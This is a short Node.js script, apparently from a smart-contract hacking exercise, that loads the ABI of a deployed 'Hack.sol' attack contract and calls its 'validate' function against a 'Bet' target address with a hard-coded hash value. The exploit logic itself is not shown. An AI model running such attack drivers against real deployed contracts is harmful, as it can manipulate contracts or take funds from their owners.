const fs = require('fs')
const lib = require('./lib')(require('./config'))

async function main() {
    let hack_address = '0xe133f6c91f269584f89b2d56c0a17ebcd530e08d' // Hack.sol deployed address
    let hack = lib.contract(hack_address, JSON.parse(fs.readFileSync('./Bet/Hack.abi')))
    await hack.call('validate', '0x84Fb598A7E8d58715d3C5F2E789570D7B5B0e290', '0x0e44e9ef04691d1f67fedc7253a68199a4c6f183a6ce2747639d6b861fd04da3')
}

main()